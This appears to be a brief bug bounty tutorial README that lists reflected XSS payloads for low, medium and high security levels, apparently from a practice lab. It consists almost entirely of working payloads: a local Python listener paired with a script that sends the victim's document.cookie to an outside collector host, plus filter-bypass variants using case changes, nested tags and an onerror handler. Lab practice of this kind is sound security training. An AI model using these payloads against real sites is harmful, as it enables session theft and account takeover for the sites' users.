# bug-bounty-tutorial
bug bounty tutorial

## 17.XSS-(Reflected)

### low
```
python3 -m http.server 1337
<script>window.location='http://127.0.0.1:1337?cookie='+document.cookie</script>
```

### medium 
```
<SCRIPT>window.location='http://127.0.0.1:1337?cookie='+document.cookie</script>
<scr<script>ipt>alert('hacked')</script>
```

### high
```
<image src/onerror=alert(1)>
```
